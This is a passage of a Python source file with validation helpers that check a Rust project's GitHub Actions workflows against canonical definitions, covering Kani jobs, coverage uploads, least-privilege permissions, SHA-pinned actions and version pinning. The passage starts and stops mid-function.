            violations.append(f"{prefix}{line}: {COVERAGE_HTML_JOB_MSG}")
        html_steps = html.get("steps") if isinstance(html, dict) else None
        if not _steps_equal_ordered(html_steps, _COVERAGE_HTML_STEPS):
            line = int(job_lines.get("coverage-html", 1))
            violations.append(f"{prefix}{line}: {COVERAGE_HTML_STEPS_MSG}")
    if workflow == "aw-editor-tests.yml":
        editor = jobs.get("test")
        if not _job_shape_ok(
            editor,
            _EDITOR_TEST_KEYS,
            _EDITOR_TEST_RUNS_ON,
            _EDITOR_TEST_TIMEOUT_MINUTES,
        ):
            line = int(job_lines.get("test", 1))
            violations.append(f"{prefix}{line}: {EDITOR_TEST_JOB_MSG}")
        editor_steps = editor.get("steps") if isinstance(editor, dict) else None
        if not _steps_equal_ordered(editor_steps, _EDITOR_TEST_STEPS):
            line = int(job_lines.get("test", 1))
            violations.append(f"{prefix}{line}: {EDITOR_TEST_STEPS_MSG}")
    return violations


def least_privilege_permission_violations(text: str, *, path: str = "") -> list[str]:
    """kani.yml and editor-ci.yml: top-level {} and each job exactly contents: read."""
    if Path(path).name not in _LEAST_PRIVILEGE_WORKFLOWS:
        return []
    prefix = f"{path}: " if path else ""
    doc, err = load_workflow_yaml(text)
    if err or not isinstance(doc, dict):
        return [f"{prefix}1: {err or TOP_PERMISSIONS_MSG}"]
    violations: list[str] = []
    perms = doc.get("permissions", _MISSING)
    if not (isinstance(perms, dict) and len(perms) == 0):
        line = int(getattr(doc, "key_lines", {}).get("permissions", 1))
        violations.append(f"{prefix}{line}: {TOP_PERMISSIONS_MSG}")
    jobs = doc.get("jobs")
    if not isinstance(jobs, dict):
        return violations
    job_lines = getattr(jobs, "key_lines", {})
    for job_id, job in jobs.items():
        job_line = int(job_lines.get(job_id, 1))
        job_perms = job.get("permissions", _MISSING) if isinstance(job, dict) else _MISSING
        exact = (
            isinstance(job_perms, dict)
            and len(job_perms) == 1
            and job_perms.get("contents") == "read"
        )
        if exact:
            continue
        entry = job_line
        if isinstance(job, dict):
            entry = int(getattr(job, "key_lines", {}).get("permissions", job_line))
        violations.append(f"{prefix}{entry}: {JOB_CONTENTS_READ_MSG}")
    return violations


def kani_version_violations(text: str, *, path: str = "") -> list[str]:
    """Read kani-version from the step's with: mapping only."""
    prefix = f"{path}: " if path else ""
    doc, err = load_workflow_yaml(text)
    if err:
        return [f"{prefix}1: {err}"]
    if doc is None:
        return []
    violations: list[str] = []
    for _job_id, _job, step in _iter_steps(doc):
        if not _is_named_action(step, "model-checking/kani-github-action"):
            continue
        line_no = _step_line(step)
        _key, version = _ci_item(_mapping(step.get("with")), "kani-version")
        if _key_outside_with(step, "kani-version") or not (
            isinstance(version, str) and _EXACT_XYZ_RE.fullmatch(version)
        ):
            violations.append(f"{prefix}{line_no}: {KANI_VERSION_MSG}")
    return violations


def _approved_kani_args(job_id: str) -> str | None:
    """Non-null args for a mapped Kani job id. An unmapped id is None."""
    entry = _KANI_JOBS.get(job_id)
    if not isinstance(entry, dict):
        return None
    args = entry.get("args")
    if not isinstance(args, str) or not args:
        return None
    return args


def _kani_with_keys_ok(body: object) -> bool:
    if not isinstance(body, dict):
        return False
    folded: set[str] = set()
    for key in body:
        if not isinstance(key, str) or key.casefold() not in _KANI_WITH_KEYS:
            return False
        folded.add(key.casefold())
    return folded == _KANI_WITH_KEYS


def _kani_required_exact(body: object, key: str, expected: str) -> bool:
    """One match whose value is exactly expected.

    Absence is not the action default. A second case-variant is not exact,
    even when `_ci_item` would return the first value.
    """
    matches = _ci_matches(body, key)
    return len(matches) == 1 and matches[0][1] == expected


def kani_dispatch_args_violations(text: str, *, path: str = "") -> list[str]:
    """Each Kani step's with: inputs are allowlisted.

    args is `--package <crate> -Z unstable-options --harness-timeout
    ${{ steps.timeout.outputs.value }}`. The only expression is
    steps.timeout.outputs.value. command is exactly cargo-kani.
    working-directory is the literal `.`. Keys are kani-version, command,
    working-directory, and args. A repeated key fails, including a
    case-variant where `_ci_item` would return the first match. args is the
    non-null string on that job id's canonical entry. An unmapped or renamed
    job fails. A null args value does not compare equal to a missing entry.
    """
    prefix = f"{path}: " if path else ""
    doc, err = load_workflow_yaml(text)
    if err:
        return [f"{prefix}1: {err}"]
    if doc is None:
        return []
    violations: list[str] = []
    for job_id, _job, step in _iter_steps(doc):
        if not _is_named_action(step, "model-checking/kani-github-action"):
            continue
        line_no = _step_line(step)
        body = step.get("with")
        if _mapping_has_duplicate(body):
            violations.append(f"{prefix}{line_no}: {KANI_DUP_MSG}")
        else:
            if not _kani_with_keys_ok(body):
                violations.append(f"{prefix}{line_no}: {KANI_WITH_MSG}")
            if not _kani_required_exact(body, "command", _KANI_COMMAND):
                violations.append(f"{prefix}{line_no}: {KANI_COMMAND_MSG}")
            if not _kani_required_exact(body, "working-directory", _KANI_WORKDIR):
                violations.append(f"{prefix}{line_no}: {KANI_WORKDIR_MSG}")
            matches = _ci_matches(body, "args")
            args = matches[0][1] if len(matches) == 1 else None
            approved = _approved_kani_args(job_id)
            # A missing map entry is None, and a null args value is None.
            # Equality would accept that pair, so a missing entry fails alone.
            if approved is None or args != approved:
                violations.append(f"{prefix}{line_no}: {KANI_ARGS_MSG}")
    return violations


def _steps_equal_ordered(steps: object, canonical: list) -> bool:
    """True when steps is that canonical list, in order, with no extras."""
    if not isinstance(steps, list) or len(steps) != len(canonical):
        return False
    return all(_step_equals_canonical(got, want) for got, want in zip(steps, canonical))


def _run_context_ok(node: object, key: str, expected: dict | None) -> bool:
    """Absent when expected is None. Otherwise the map equals expected."""
    if not isinstance(node, dict):
        return False
    if expected is None:
        return key not in node
    if key not in node:
        return False
    return _mapping_equals(node.get(key), expected)


def run_context_violations(text: str, *, path: str = "") -> list[str]:
    """defaults is absent. Workflow env follows the per-file rule.

    Applies to coverage.yml, aw-editor-tests.yml, and kani.yml, at workflow
    level and on every job. Any defaults key fails. Workflow env is absent
    in coverage.yml and the canonical variable map in the other two.
    Job-level env is absent. A custom shell, a working-directory, or an
    env map that is not canonical fails.
    """
    name = Path(path).name
    if name not in _RUN_CONTEXT_WORKFLOWS:
        return []
    prefix = f"{path}: " if path else ""
    doc, err = load_workflow_yaml(text)
    if err:
        return [f"{prefix}1: {err}"]
    if not isinstance(doc, dict):
        return [f"{prefix}1: {RUN_CONTEXT_MSG}"]
    violations: list[str] = []

    def check(node: dict, key: str, expected: dict | None, fallback: int) -> None:
        if _run_context_ok(node, key, expected):
            return
        line = int(getattr(node, "key_lines", {}).get(key, fallback))
        violations.append(f"{prefix}{line}: {RUN_CONTEXT_MSG}")

    top = int(getattr(doc, "yaml_line", 1))
    check(doc, "defaults", None, top)
    check(doc, "env", _WORKFLOW_ENV[name], top)
    jobs = doc.get("jobs")
    if not isinstance(jobs, dict):
        return violations
    job_lines = getattr(jobs, "key_lines", {})
    for job_id, job in jobs.items():
        job_line = int(job_lines.get(job_id, 1))
        if not isinstance(job, dict):
            violations.append(f"{prefix}{job_line}: {RUN_CONTEXT_MSG}")
            continue
        check(job, "defaults", None, job_line)
        check(job, "env", None, job_line)
    return violations


def rust_ci_setup_violations(text: str, *, path: str = "") -> list[str]:
    """The shared setup action matches the canonical action document.

    Top-level keys are name, description, inputs, and runs. inputs are
    toolchain, components, and install-nextest, including each default.
    runs.using is composite and runs has no other key beside steps.
    runs.steps is the ordered list, including one RUSTC_WRAPPER assignment
    in Enable sccache. An extra step, including one that writes GITHUB_ENV,
    fails. The toolchain input default is the pinned toolchain.
    """
    if "rust-ci-setup" not in Path(path).as_posix():
        return []
    prefix = f"{path}: " if path else ""
    doc, err = load_workflow_yaml(text)
    if err:
        return [f"{prefix}1: {err}"]
    if not isinstance(doc, dict):
        return [f"{prefix}1: {RUST_CI_SETUP_KEYS_MSG}"]
    violations: list[str] = []
    if set(doc) != _RUST_CI_SETUP_KEYS:
        line = int(getattr(doc, "yaml_line", 1))
        violations.append(f"{prefix}{line}: {RUST_CI_SETUP_KEYS_MSG}")
    inputs = doc.get("inputs")
    if not _mapping_equals(inputs, _RUST_CI_SETUP_INPUTS):
        line = int(getattr(doc, "key_lines", {}).get("inputs", 1))
        violations.append(f"{prefix}{line}: {RUST_CI_SETUP_INPUTS_MSG}")
    toolchain = inputs.get("toolchain") if isinstance(inputs, dict) else None
    if not isinstance(toolchain, dict) or toolchain.get("default") != _RUST_CI_SETUP_TOOLCHAIN:
        line = 1
        if isinstance(toolchain, dict):
            line = int(getattr(toolchain, "key_lines", {}).get("default", 1))
        violations.append(f"{prefix}{line}: {RUST_CI_SETUP_TOOLCHAIN_MSG}")
    runs = doc.get("runs")
    runs_keys_ok = isinstance(runs, dict) and set(runs) == _RUST_CI_SETUP_RUNS_KEYS
    using_ok = isinstance(runs, dict) and runs.get("using") == _RUST_CI_SETUP_USING
    if not runs_keys_ok or not using_ok:
        line = int(getattr(runs, "yaml_line", 1)) if isinstance(runs, dict) else 1
        violations.append(f"{prefix}{line}: {RUST_CI_SETUP_RUNS_MSG}")
    steps = runs.get("steps") if isinstance(runs, dict) else None
    if not _steps_equal_ordered(steps, _RUST_CI_SETUP_STEPS):
        line = int(getattr(runs, "yaml_line", 1)) if isinstance(runs, dict) else 1
        violations.append(f"{prefix}{line}: {RUST_CI_SETUP_MSG}")
    return violations


def _has_overwrite(node: object) -> bool:
    if not isinstance(node, dict):
        return False
    return any(isinstance(key, str) and key.casefold() == "overwrite" for key in node)


def _constant_expression(expr: str) -> str | None:
    """A quoted string, or quoted strings joined by +, or None."""
    parts = [part.strip() for part in expr.split("+")]
    if not parts:
        return None
    chunks: list[str] = []
    for part in parts:
        if len(part) < 2 or part[0] not in "\"'" or part[-1] != part[0]:
            return None
        body = part[1:-1]
        if part[0] in body:
            return None
        chunks.append(body)
    return "".join(chunks)


def _resolve_artifact_name(name: str) -> str | None:
    """The name with constant ${{ }} expressions substituted, else None."""
    pieces = _EXPRESSION_RE.split(name)
    if len(pieces) < 2 or len(pieces) % 2 == 0:
        return None
    rendered: list[str] = []
    for index, piece in enumerate(pieces):
        if index % 2 == 0:
            if "${{" in piece:
                return None
            rendered.append(piece)
            continue
        constant = _constant_expression(piece)
        if constant is None:
            return None
        rendered.append(constant)
    return "".join(rendered)


def _unresolved_name_could_be_pinned(name: str) -> bool:
    """True when an unresolved expression could still be a pinned report name."""
    pieces = _EXPRESSION_RE.split(name)
    if len(pieces) == 1 or len(pieces) % 2 == 0:
        return True
    pattern = ""
    for index, piece in enumerate(pieces):
        if index % 2 == 0:
            if "${{" in piece:
                return True
            pattern += re.escape(piece)
        else:
            pattern += ".*"
    compiled = re.compile("^" + pattern + "$")
    return any(compiled.fullmatch(pinned) for pinned in _PINNED_REPORT_NAME_VALUES)


def _could_be_pinned_report_name(name: object) -> bool:
    """True when an upload name is, or could be, coverage-xml or aw-editor-lcov.

    A ${{ }} expression of quoted strings is resolved. An expression that
    cannot be resolved fails closed when the literal text could still be
    one of those names.
    """
    if not isinstance(name, str):
        return False
    if "${{" not in name:
        return name in _PINNED_REPORT_NAME_VALUES
    resolved = _resolve_artifact_name(name)
    if resolved is not None:
        return resolved in _PINNED_REPORT_NAME_VALUES
    return _unresolved_name_could_be_pinned(name)


def coverage_report_publish_violations(text: str, *, path: str = "") -> list[str]:
    """Only the producer upload may publish the pinned report name.

    coverage-xml and aw-editor-lcov are those names. The one plain producer
    upload in coverage.yml or aw-editor-tests.yml is the exception. Any other
    upload of either name fails, including a second producer upload, a
    constant ${{ }} expression, an unresolved expression that could be that
    name, a local composite, and a reusable workflow. An overwrite key on a
    step or under with: fails in every scanned file.
    """
    prefix = f"{path}: " if path else ""
    doc, err = load_workflow_yaml(text)
    if err:
        return [f"{prefix}1: {err}"]
    if not isinstance(doc, dict):
        return []
    allowed = _PINNED_REPORT_NAMES.get(Path(path).name)
    violations: list[str] = []
    pinned_jobs: list[str] = []
    for job_id, _job, step in _iter_steps(doc):
        if _has_overwrite(step) or _has_overwrite(step.get("with")):
            violations.append(f"{prefix}{_step_line(step)}: {OVERWRITE_MSG}")
        if not _is_named_action(step, "actions/upload-artifact"):
            continue
        _key, name = _ci_item(_mapping(step.get("with")), "name")
        plain_producer = (
            allowed is not None
            and isinstance(name, str)
            and "${{" not in name
            and name == allowed
        )
        if plain_producer:
            pinned_jobs.append(job_id)
            continue
        if _could_be_pinned_report_name(name):
            violations.append(f"{prefix}{_step_line(step)}: {PINNED_REPORT_MSG}")
    if allowed is not None:
        if any(job_id != "coverage" for job_id in pinned_jobs):
            violations.append(f"{prefix}1: {PINNED_REPORT_MSG}")
        if sum(job_id == "coverage" for job_id in pinned_jobs) != 1:
            violations.append(f"{prefix}1: {PINNED_REPORT_MSG}")
    return violations


def _job_has_kani_action(job: dict) -> bool:
    steps = job.get("steps")
    if not isinstance(steps, list):
        return False
    return any(
        isinstance(step, dict) and _is_named_action(step, "model-checking/kani-github-action")
        for step in steps
    )


def _kani_job_shape_ok(job_id: str, job: dict) -> bool:
    """The mapped job's keys, runner, and timeout are the canonical values."""
    if set(job) != _KANI_JOB_KEYS:
        return False
    if job.get("runs-on") != _PINNED_RUNS_ON:
        return False
    if job.get("timeout-minutes") != _KANI_TIMEOUT_MINUTES.get(job_id):
        return False
    return True


def _kani_fail_step_ok(job: dict) -> bool:
    """The fail step is present once and equals the canonical step.

    The canonical if: is true for every result other than success, so a
    skipped or cancelled job fails the gate.
    """
    found = [
        step
        for step in job["steps"]
        if step.get("name") == _KANI_FAIL_STEP["name"]
    ]
    if len(found) != 1:
        return False
    return _step_equals_canonical(found[0], _KANI_FAIL_STEP)


def _kani_summary_shape_ok(job: dict) -> bool:
    """Summary keys, runner, and timeout are the canonical values."""
    if set(job) != _KANI_SUMMARY_KEYS:
        return False
    if job.get("runs-on") != _PINNED_RUNS_ON:
        return False
    if job.get("timeout-minutes") != _KANI_SUMMARY_TIMEOUT_MINUTES:
        return False
    return True


def _kani_summary_gate_ok(job: object) -> bool:
    """Exact summary job, ordered steps, needs in order, and the fail step."""
    if not isinstance(job, dict):
        return False
    if not _kani_summary_shape_ok(job):
        return False
    needs = job.get("needs")
    if list(needs) != _KANI_SUMMARY_NEEDS:
        return False
    if job.get("if") != _KANI_SUMMARY_IF:
        return False
    if not _steps_equal_ordered(job.get("steps"), _KANI_SUMMARY_STEPS):
        return False
    return _kani_fail_step_ok(job)


def _upload_runner_ok(job: dict) -> bool:
    """The Codecov upload job's runner and timeout are the pinned values."""
    if job.get("runs-on") != _PINNED_RUNS_ON:
        return False
    if job.get("timeout-minutes") != _UPLOAD_TIMEOUT_MINUTES:
        return False
    return True


def _job_shape_ok(job: object, keys: frozenset, runs_on: str, timeout: int) -> bool:
    """The job's key set, runs-on, and timeout-minutes are the pinned values."""
    if not isinstance(job, dict):
        return False
    if set(job) != keys:
        return False
    if job.get("runs-on") != runs_on:
        return False
    if job.get("timeout-minutes") != timeout:
        return False
    return True


def kani_job_steps_violations(text: str, *, path: str = "") -> list[str]:
    """Each Kani job is the canonical ordered step list for its job id.

    The entry's args is a non-null string. Checkout, the timeout step, the
    Kani action, and the report upload each equal the canonical step,
    including the action step's keys and env. An inserted, removed, or
    reordered step fails, including a step appended after the last canonical
    step. The job keys are name, permissions, runs-on, timeout-minutes, and
    steps. runs-on is ubuntu-latest. timeout-minutes is the per-job value.
    A job-level if: fails. A step if: or continue-on-error fails. An unmapped
    or renamed job that runs the action fails. The summary job's keys are
    name, permissions, runs-on, timeout-minutes, needs, if, and steps.
    runs-on is ubuntu-latest and timeout-minutes is 10. needs lists every
    mapped Kani job in that order. if: is always(). The steps are Check
    Results, then the fail step. A changed Check Results step fails. The
    fail step equals the canonical step, so a skipped or cancelled result
    fails the gate.
    """
    if Path(path).name != "kani.yml":
        return []
    prefix = f"{path}: " if path else ""
    doc, err = load_workflow_yaml(text)
    if err:
        return [f"{prefix}1: {err}"]
    if not isinstance(doc, dict):
        return []
    jobs = doc.get("jobs")
    if not isinstance(jobs, dict):
        return []
    violations: list[str] = []
    job_lines = getattr(jobs, "key_lines", {})
    summary = jobs.get("summary")
    if not _kani_summary_gate_ok(summary):
        line = int(job_lines.get("summary", 1))
        violations.append(f"{prefix}{line}: {KANI_SUMMARY_MSG}")
    for job_id, job in jobs.items():
        if not isinstance(job, dict):
            continue
        entry = _KANI_JOBS.get(str(job_id))
        line = int(job_lines.get(job_id, 1))
        if entry is None:
            if _job_has_kani_action(job):
                violations.append(f"{prefix}{line}: {KANI_JOB_STEPS_MSG}")
            continue
        if not _kani_job_shape_ok(str(job_id), job):
            violations.append(f"{prefix}{line}: {KANI_JOB_SHAPE_MSG}")
        if any(
            isinstance(key, str) and key.casefold() == "continue-on-error" for key in job
        ):
            violations.append(f"{prefix}{line}: {KANI_JOB_STEPS_MSG}")
        args = entry.get("args")
        steps = entry.get("steps")
        if not isinstance(args, str) or not args or not isinstance(steps, list):
            violations.append(f"{prefix}{line}: {KANI_JOB_STEPS_MSG}")
            continue
        if not _steps_equal_ordered(job.get("steps"), steps):
            violations.append(f"{prefix}{line}: {KANI_JOB_STEPS_MSG}")
    return violations


def kani_timeout_run_violations(text: str, *, path: str = "") -> list[str]:
    """Each Kani job's timeout step equals the canonical step.

    The keys are name, id, env, and run. env is exactly
    KANI_TIMEOUT_INPUT set to github.event.inputs.timeout. run matches the
    approved script after trailing whitespace is trimmed. Leading whitespace
    fails. An extra key, a changed env value, an extra run line, or a second
    timeout step fails.
    """
    prefix = f"{path}: " if path else ""
    doc, err = load_workflow_yaml(text)
    if err:
        return [f"{prefix}1: {err}"]
    if doc is None:
        return []
    kani_jobs: set[str] = set()
    timeout_steps: dict[str, list[dict]] = {}
    for job_id, _job, step in _iter_steps(doc):
        if _is_named_action(step, "model-checking/kani-github-action"):
            kani_jobs.add(job_id)
            timeout_steps.setdefault(job_id, [])
        if step.get("id") == "timeout":
            timeout_steps.setdefault(job_id, []).append(step)
    violations: list[str] = []
    for job_id in sorted(kani_jobs):
        steps = timeout_steps.get(job_id, [])
        if len(steps) == 1 and _step_equals_canonical(steps[0], _KANI_TIMEOUT_STEP):
            continue
        line_no = _step_line(steps[0]) if steps else 1
        violations.append(f"{prefix}{line_no}: {KANI_TIMEOUT_MSG}")
    return violations


def _plain_word_false(mapping: object, key: str) -> bool:
    matches = _ci_matches(mapping, key)
    if len(matches) != 1:
        return False
    actual, value = matches[0]
    if value is not False:
        return False
    found = getattr(mapping, "scalar_style", {}).get(actual)
    if not isinstance(found, tuple) or len(found) != 2:
        return False
    style, raw = found
    return style is None and isinstance(raw, str) and raw.casefold() == "false"


def checkout_persist_credentials_violations(text: str, *, path: str = "") -> list[str]:
    """coverage.yml, aw-editor-tests.yml, and kani.yml checkouts match the canonical step.

    persist-credentials is the plain boolean false. The with: map is that
    key alone. repository, ref, token, and an extra run line fail.
    """
    if Path(path).name not in _CHECKOUT_PERSIST_WORKFLOWS:
        return []
    prefix = f"{path}: " if path else ""
    doc, err = load_workflow_yaml(text)
    if err:
        return [f"{prefix}1: {err}"]
    if doc is None:
        return []
    violations: list[str] = []
    for _job_id, _job, step in _iter_steps(doc):
        if not _is_named_action(step, "actions/checkout"):
            continue
        body = step.get("with")
        if _mapping_has_duplicate(body) or not _plain_word_false(body, "persist-credentials"):
            violations.append(f"{prefix}{_step_line(step)}: {CHECKOUT_PERSIST_MSG}")
        canonical = _CHECKOUT_CANONICAL[Path(path).name]
        if not _step_equals_canonical(step, canonical):
            violations.append(f"{prefix}{_step_line(step)}: {CHECKOUT_STEP_MSG}")
    return violations


def kani_action_sha_violations(text: str, *, path: str = "") -> list[str]:
    """kani.yml checkout and upload-artifact refs are 40-character SHAs.

    editor-ci.yml stays on the major-tag rule. A local `./` action has no ref.
    """
    if Path(path).name != "kani.yml":
        return []
    prefix = f"{path}: " if path else ""
    found, err = _parsed_uses(text)
    if err:
        return [f"{prefix}1: {err}"]
    violations: list[str] = []
    for line_no, uses in found:
        if uses.startswith("./"):
            continue
        action = _action_name(uses)
        if action not in _KANI_SHA_ACTIONS:
            continue
        ref = uses.rsplit("@", 1)[1] if "@" in uses else ""
        if _SHA_REF_RE.fullmatch(ref) is None:
            violations.append(f"{prefix}{line_no}: {action}@{ref} {KANI_ACTION_SHA_MSG}")
    return violations


def _shell_commands(script: str) -> list[str]:
    joined = script.replace("\\\r\n", " ").replace("\\\n", " ")
    return [
        part.strip()
        for part in re.split(r"(?:&&|\|\||;|\n)", joined)
        if part.strip()
    ]


def _llvm_install_unpinned(script: str) -> bool:
    for command in _shell_commands(script):
        tokens = command.split()
        if len(tokens) < 3 or tokens[0] != "cargo" or tokens[1] != "install":
            continue
        if "cargo-llvm-cov" not in tokens[2:]:
            continue
        if "--locked" not in tokens or "--version" not in tokens:
            return True
        index = tokens.index("--version")
        if index + 1 >= len(tokens) or _EXACT_XYZ_RE.fullmatch(tokens[index + 1]) is None:
            return True
    return False


def llvm_cov_pin_violations(text: str, *, path: str = "") -> list[str]:
    """Every cargo install of cargo-llvm-cov in a run script must be pinned.

    `tool` for taiki-e/install-action is read only from that step's with:.
    """
    prefix = f"{path}: " if path else ""
    doc, err = load_workflow_yaml(text)
    if err:
        return [f"{prefix}1: {err}"]
    if doc is None:
        return []
    violations: list[str] = []
    for _job_id, _job, step in _iter_steps(doc):
        run = step.get("run")
        if isinstance(run, str) and _llvm_install_unpinned(run):
            line_no = int(getattr(step, "key_lines", {}).get("run", _step_line(step)))
            violations.append(f"{prefix}{line_no}: {LLVM_COV_CARGO_MSG}")
        if not _is_named_action(step, "taiki-e/install-action"):
            continue
        step_name = step.get("name")
        _key, tool = _ci_item(_mapping(step.get("with")), "tool")
        tool_names_package = isinstance(tool, str) and (
            tool == "cargo-llvm-cov" or tool.startswith("cargo-llvm-cov@")
        )
        name_names_package = isinstance(step_name, str) and "cargo-llvm-cov" in step_name
        if not tool_names_package and not name_names_package:
            continue
        pinned = isinstance(tool, str) and _LLVM_TOOL_VALUE_RE.fullmatch(tool) is not None
        if not pinned or _key_outside_with(step, "tool"):
            violations.append(f"{prefix}{_step_line(step)}: {LLVM_COV_ACTION_MSG}")
    return violations


def github_action_surfaces() -> list[Path]:
    roots = (WORKFLOWS, ROOT / ".github" / "actions")
    found: list[Path] = []
    for root in roots:
        found.extend(root.rglob("*.yml"))
        found.extend(root.rglob("*.yaml"))
    return sorted(found)


def find_action_uses_pos(block: str, action: str) -> int:
    pos = -1
    for match in ACTION_USES_RE.finditer(block):
        if match.group("action") == action:
            pos = match.start()
    return pos


def summary_checkout_step_line(text: str) -> str:
    summary = mutation_summary_job(text)
    for line in summary.splitlines():
        if "uses: actions/checkout@" in line:
            return line
    raise AssertionError("mutants-summary missing checkout step")


def workflow_texts() -> dict[str, str]:
    return {path.name: path.read_text(encoding="utf-8") for path in sorted(WORKFLOWS.glob("*.yml"))}


def workflow_display_names() -> set[str]:
    names: set[str] = set()
    name_re = re.compile(r"^name:\s*(.+?)\s*$")
    for text in workflow_texts().values():
        for line in text.splitlines():
            match = name_re.match(line)
            if not match:
                continue
            value = match.group(1).strip()
            if len(value) >= 2 and value[0] == value[-1] and value[0] in "\"'":
                value = value[1:-1]
            names.add(value)
            break
    return names


def nightly_failure_watched_workflows(text: str) -> list[str]:
    watched: list[str] = []
    in_list = False
    for line in text.splitlines():
        if re.match(r"^\s+workflows:\s*$", line):
            in_list = True
            continue
        if not in_list:
            continue
        item = re.match(r"^\s+-\s+(.+)\s*$", line)
        if item:
            watched.append(item.group(1).strip())
            continue
        if line.strip():
            break
    return watched


def _on_value(doc: dict) -> object:
    for key, value in doc.items():
        if key is True or (isinstance(key, str) and key.casefold() == "on"):
            return value
    return _MISSING


def workflow_event_names(text: str) -> tuple[set[str] | None, str | None]:
    """Event names from `on:`, including string, list, and mapping forms.

    PyYAML 1.1 loads a bare `on` key as `True`. A quoted `"on"` stays a string.
    """
    doc, err = load_workflow_yaml(text)
    if err:
        return None, err
    if not isinstance(doc, dict):
        return set(), None
    node = _on_value(doc)
    if node is _MISSING or node is None:
        return set(), None
    if isinstance(node, str):
        return {node}, None
    if isinstance(node, list):
        names: set[str] = set()
        for item in node:
            if not isinstance(item, str):
                return None, "workflow on: list must be event names"
            names.add(item)
        return names, None
    if isinstance(node, dict):
        names = set()
        for key in node:
            if not isinstance(key, str):
                return None, "workflow on: key must be an event name"
            names.add(key)
        return names, None
    return None, "workflow on: must be a string, list, or mapping"


def has_pull_request(text: str) -> bool:
    names, err = workflow_event_names(text)
    if err or names is None:
        return False
    return "pull_request" in names


def coverage_artifact_pin_violations(text: str, *, path: str = "") -> list[str]:
    """Every non-local uses: in the two codecov workflows is a commit SHA.

    A local `./` action has no ref. A major tag, including
    `actions/checkout@v7`, fails. Other workflow file names are not in scope.
    """
    if Path(path).name not in _COVERAGE_WORKFLOW_NAMES:
        return []
    prefix = f"{path}: " if path else ""
    found, err = _parsed_uses(text)
    if err:
        return [f"{prefix}1: {err}"]
    violations: list[str] = []
    for line_no, uses in found:
        if uses.startswith("./"):
            continue
        action = _action_name(uses)
        ref = uses.rsplit("@", 1)[1] if "@" in uses else ""
        if _SHA_REF_RE.fullmatch(ref) is None:
            violations.append(
                f"{prefix}{line_no}: {action}@{ref} {COVERAGE_ARTIFACT_SHA_MSG}"
            )
    return violations


def codecov_trigger_violations(text: str, *, path: str = "") -> list[str]:
    """coverage.yml and aw-editor-tests.yml run only on trusted events."""
    if Path(path).name not in _COVERAGE_WORKFLOW_NAMES:
        return []
    prefix = f"{path}: " if path else ""
    names, err = workflow_event_names(text)
    if err:
        return [f"{prefix}1: {err}"]
    if names == _CODECOV_EVENTS:
        return []
    doc, _load_err = load_workflow_yaml(text)
    line = 1
    if isinstance(doc, dict):
        for key in doc:
            if key is True or (isinstance(key, str) and key.casefold() == "on"):
                line = int(getattr(doc, "key_lines", {}).get(key, 1))
                break
    return [f"{prefix}{line}: {CODECOV_EVENT_MSG}"]


def jobs_missing_timeout(text: str) -> list[str]:
    lines = text.splitlines()
    in_jobs = False
    current = None
    has_timeout = False
    missing: list[str] = []

    def flush() -> None:
        nonlocal current, has_timeout
        if current and not has_timeout:
            missing.append(current)
        current = None
        has_timeout = False

    for line in lines:
        if line.startswith("jobs:"):
            in_jobs = True
            continue
        if not in_jobs:
            continue
        if line and not line.startswith(" ") and not line.startswith("#"):
            flush()
            break
        if (
            line.startswith("  ")
            and not line.startswith("   ")
            and line.rstrip().endswith(":")
            and not line.strip().startswith("#")
        ):
            flush()
            current = line.strip()[:-1]
            has_timeout = False
            continue
        if current and "timeout-minutes:" in line:
            has_timeout = True
    flush()
    return missing


MUTATION_TESTING = WORKFLOWS / "mutation-testing.yml"
VERIFY_BASELINE_ERROR = "baseline did not complete successfully"
VERIFY_NO_MUTANTS_ERROR = "no mutant outcomes recorded after baseline"
VERIFY_END_TIME_ERROR = "cargo-mutants did not finish (end_time is null)"
VERIFY_INCOMPLETE_ERROR = "incomplete shard:"


def mutation_testing_text() -> str:
    return MUTATION_TESTING.read_text(encoding="utf-8")


def mutation_ai_job(text: str) -> str:
    return text.split("  mutants-ai:\n", 1)[1].split("\n  mutants-behavior:\n", 1)[0]


def mutation_summary_job(text: str) -> str:
    return text.split("  mutants-summary:\n", 1)[1]


def job_step_block(job: str, step_name: str) -> str:
    marker = f"- name: {step_name}"
    start = job.find(marker)
    if start < 0:
        raise AssertionError(f"missing step {step_name!r}")
    rest = job[start + len(marker) :]
    next_step = rest.find("\n      - ")
    if next_step < 0:
        return rest
    return rest[:next_step]


def _run_script(step_block: str) -> str:
    if "run:" not in step_block:
        return ""
    return step_block.split("run:", 1)[1]


def _python_run_lines(run: str) -> list[str]:
    return [
        line
        for line in run.splitlines()
        if "python3 scripts/ci/mutation_ai_outcomes.py" in line
    ]


# actions/runner ScriptHandler.FixUpScriptContents for `shell: pwsh`, then
# `pwsh -command ". '{0}'"`. Issue #693: a bare dot-source is not that wrapper.
_RUNNER_PWSH_PREAMBLE = "$ErrorActionPreference = 'stop'\n"
_RUNNER_PWSH_EPILOGUE = (
    "if ((Test-Path -LiteralPath variable:\\LASTEXITCODE)) { exit $LASTEXITCODE }\n"
)
_STATUS_FN_RE = re.compile(r"\b(?:success|always|cancelled|failure)\s*\(")
_STATUS_GUARD_RE = re.compile(
    r"(?:!\s*cancelled|always|failure|success|cancelled)\s*\(\s*\)\s*(?:&&|\|\|)\s*"
)
_STEP_OUTPUT_RE = re.compile(
    r"steps\.([A-Za-z_][A-Za-z0-9_]*)\.outputs\.([A-Za-z_][A-Za-z0-9_]*)"
)
_ALERT_ISSUE_STEPS = (
    "Create GitHub issue for regression",
    "Upload regression report",
)


def pwsh_run_body(step_block: str) -> str:
    if "run: |" not in step_block:
        raise AssertionError("step has no literal run block")
    lines = step_block.split("run: |", 1)[1].splitlines()
    while lines and not lines[0].strip():
        lines.pop(0)
    indents = [len(line) - len(line.lstrip(" ")) for line in lines if line.strip()]
    if not indents:
        raise AssertionError("empty pwsh run block")
    cut = min(indents)
    body = "\n".join(line[cut:] if line.strip() else "" for line in lines)
    return body.rstrip() + "\n"


def step_if_expression(step_block: str) -> str:
    for line in step_block.splitlines():
        stripped = line.strip()
        if not stripped.startswith("if:"):
            continue
        value = stripped[3:].strip()
        if len(value) >= 2 and value[0] == value[-1] and value[0] in "\"'":
            value = value[1:-1]
        return value
    raise AssertionError("step is missing if:")


def github_step_if_runs(
    expr: str,
    *,
    failed: bool,
    cancelled: bool,
    outputs: dict[tuple[str, str], str],
) -> bool:
    """Evaluate a step `if:` the way Actions does, including implicit success()."""
    raw = expr.strip()
    if raw.startswith("${{") and raw.endswith("}}"):
        raw = raw[3:-2].strip()
    if _STATUS_FN_RE.search(raw) is None:
        raw = f"success() && ({raw})"

    def lookup(match: re.Match[str]) -> str:
